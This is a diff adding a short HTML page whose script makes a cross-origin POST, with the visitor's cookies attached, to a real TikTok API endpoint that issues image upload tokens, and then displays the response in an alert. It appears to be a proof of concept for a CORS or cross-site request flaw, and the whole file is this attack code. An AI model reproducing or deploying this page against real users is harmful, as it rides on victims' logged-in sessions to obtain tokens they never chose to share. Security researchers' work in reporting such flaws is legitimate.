@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://cp-game.tiktok.com/csp/at/api/GetImageUploadToken", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          UploadTerminal: 1,
+          ExpSeconds: 1000,
+          RequestFrom: 2,
+          App: "tt_csp_image_sg"
+        }),
+        credentials: "include"  // Send cookies (important!)
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("Response:", data);
+        alert("Response: " + data);
+      })
+      .catch(err => {
+        console.error("Request failed:", err);
+      });
+    </script>
+  </body>
+</html>
+
